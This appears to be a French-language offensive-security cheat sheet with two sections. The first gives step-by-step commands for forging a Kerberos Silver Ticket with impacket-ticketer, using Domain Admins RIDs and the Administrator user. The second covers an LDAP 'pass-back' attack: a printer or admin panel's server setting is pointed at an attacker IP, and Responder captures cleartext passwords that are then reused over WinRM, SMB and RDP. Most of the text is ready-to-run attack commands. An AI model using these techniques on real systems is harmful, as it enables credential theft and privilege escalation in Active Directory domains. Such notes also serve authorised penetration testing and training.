# Silver Ticket

## Requirements
- NTLM hash du compte de service
- Domain SID
- Service Principal Name (SPN)

## Steps

### 1. Calculer le hash NTLM
```bash
python3 -c 'import hashlib; print(hashlib.new("md4", "PASSWORD".encode("utf-16le")).hexdigest())'
```

### 2. Obtenir le Domain SID

**Via MSSQL:**
```sql
SELECT SUSER_SID();
# Résultat hex: 0x0105000000...
# Convertir avec script Python (voir Tools/SID-Conversion.md)
```

**Via rpcclient:**
```bash
rpcclient -U "user%password" <DC_IP>
rpcclient $> lsaquery
```

**Via PowerShell:**
```powershell
(Get-ADDomain).DomainSID.Value
```

### 3. Identifier les groupes privilégiés

```sql
# Récupérer le RID d'un groupe
SELECT SUSER_SID('DOMAIN\GroupName');
```

### 4. Définir le SPN

| Service | Format |
|---------|--------|
| MSSQL | `MSSQLSvc/hostname.domain.com:1433` |
| CIFS | `cifs/hostname.domain.com` |
| HTTP | `HTTP/hostname.domain.com` |
| LDAP | `ldap/hostname.domain.com` |

### 5. Générer le ticket

```bash
impacket-ticketer \
  -nthash <NTLM_HASH> \
  -domain-sid <DOMAIN_SID> \
  -domain <DOMAIN> \
  -spn <SPN> \
  -groups <GROUP_RIDs> \
  -user-id <USER_RID> \
  <USERNAME>
```

**Exemple:**
```bash
impacket-ticketer \
  -nthash a1b2c3d4... \
  -domain-sid "S-1-5-21-123456789-123456789-123456789" \
  -domain CORP.LOCAL \
  -spn MSSQLSvc/sql01.corp.local:1433 \
  -groups 512,1105 \
  -user-id 500 \
  Administrator
```

### 6. Utiliser le ticket

```bash
export KRB5CCNAME=$(pwd)/Administrator.ccache
mssqlclient.py -k -no-pass hostname.domain.com
```

## RIDs importants

| RID | Nom |
|-----|-----|
| 500 | Administrator |
| 512 | Domain Admins |
| 519 | Enterprise Admins |

---

# LDAP Credential Capture

Forcer une application à s'authentifier vers un serveur LDAP contrôlé pour capturer les credentials.

## Prérequis

- Interface web avec configuration LDAP modifiable
- Responder en écoute
- Connectivité réseau LDAP (port 389)

## Steps

### 1. Identifier la cible

Rechercher des formulaires permettant de configurer :
- Server Address / LDAP Server
- Port (389 par défaut)
- Username / Password

**Exemples courants :**
- Panels d'administration d'imprimantes
- Interfaces de configuration LDAP
- Systèmes de monitoring
- Applications avec authentification LDAP

### 2. Lancer Responder

```bash
sudo responder -I tun0
```

### 3. Modifier la configuration LDAP

Dans l'interface web, changer le Server Address vers votre IP :

```
Server Address: <ATTACKER_IP>
Port: 389
Username: (laisser tel quel)
Password: (laisser tel quel)
```

### 4. Trigger la connexion

Cliquer sur "Update" ou "Test Connection" pour forcer l'application à se connecter.

### 5. Capturer les credentials

Responder affiche :
```
[LDAP] Cleartext Client   : <TARGET_IP>
[LDAP] Cleartext Username : domain\username
[LDAP] Cleartext Password : P@ssw0rd123!
```

## Utilisation des credentials

### Via WinRM

```bash
evil-winrm -i <TARGET> -u username -p 'password'
```

### Via SMB

```bash
smbclient.py domain/username:'password'@<TARGET>
```

### Via RDP

```bash
xfreerdp /u:username /p:'password' /v:<TARGET>
```

## Variantes

### Modification de configuration mail/SMTP

```
SMTP Server: <ATTACKER_IP>
Port: 25/587
```

### Modification de serveur Syslog

```
Syslog Server: <ATTACKER_IP>
Port: 514
```

### Modification de serveur NTP

```
NTP Server: <ATTACKER_IP>
Port: 123
```

## Notes

- Credentials souvent en **clair** (pas de hash)
- Fonctionne avec services nécessitant authentification LDAP/AD
- Alternative à Responder : `nc -lvnp 389` pour voir la requête brute
